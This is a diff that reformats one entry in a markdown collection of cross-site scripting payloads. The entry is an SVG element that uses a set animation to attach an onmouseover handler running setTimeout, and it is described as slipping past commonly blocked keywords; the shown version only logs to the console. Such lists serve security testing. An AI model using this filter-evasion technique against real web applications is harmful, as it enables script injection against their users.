@@ -3,10 +3,11 @@
 This section contains examples of Cross-Site Scripting (XSS) payloads designed to demonstrate potential vulnerabilities in web applications.
 
 ## Payloads
-1. **SVG XSS with `setTimeout`**  
-   Description: This payload triggers JavaScript using an SVG element without relying on commonly blocked keywords.
-   ```html
-   <svg xmlns="http://www.w3.org/2000/svg">
-     <set attributeName="onmouseover" to="setTimeout(() => console.log('XSS Triggered'), 1000)" />
-     <text x="10" y="20">Hover me</text>
-   </svg>
+
+### 1. **SVG XSS with `setTimeout`**
+**Description**: This payload triggers JavaScript using an SVG element without relying on commonly blocked keywords.
+```html
+<svg xmlns="http://www.w3.org/2000/svg">
+  <set attributeName="onmouseover" to="setTimeout(() => console.log('XSS Triggered'), 1000)" />
+  <text x="10" y="20">Hover me</text>
+</svg>
